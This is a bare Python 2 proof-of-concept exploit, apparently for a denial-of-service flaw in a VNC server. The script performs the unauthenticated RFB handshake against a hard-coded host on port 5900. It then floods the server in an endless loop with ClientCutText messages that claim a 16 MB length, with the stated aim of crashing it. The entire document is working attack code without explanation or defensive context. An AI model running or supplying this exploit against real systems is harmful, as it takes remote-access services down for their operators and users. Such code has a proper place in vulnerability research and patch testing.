##Proof of Concept#
import sys, struct, socket
host ='172.31.159.245'
port = 5900

def crash_vnc_server():
    try:
        while 1:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.settimeout(1.0)       
            
            print 'Connected'

            try:
                b = s.recv(8192)
                print 'ProtocolVersion Received'
                
                s.send(b)
                print 'ProtocolVersion Sent'            
                
                b = s.recv(8192)
                print 'Security Received'

                s.send('\x01')
                print 'Security Sent'
                
                # Recv SecurityResult
                b = s.recv(8192)
                print 'SecurityResult Received'

                if (len(b) == 4 and
                    b[0] == chr(0) and
                    b[1] == chr(0) and
                    b[2] == chr(0) and
                    b[3] == chr(0)):
                    print 'SecurityResult OK'
                else:
                    print 'SecurityResult Failed.\n\nThe server must be set '\
                          'to No Authentication for this to work, otherwise '\
                          'you \'ll need to write the necessary client side '\
                          'authentication code yourself.'
                    return           

                s.send('\x01')
                print 'ClientInit Sent'
                
                b = s.recv(8192)
                print 'ServerInit Received'

                text_len = 0xFFFFFF
                text_str = struct.pack('L', text_len) + '\xAA' * text_len
                
                while 1:
                    s.send('\x06\x00\x00\x00' + text_str)

                    print 'ClientCutText Sent'
                
            except Exception:
                print 'Connection closed'                
            
    except Exception:
        print 'Couldn\'t connect'

crash_vnc_server()
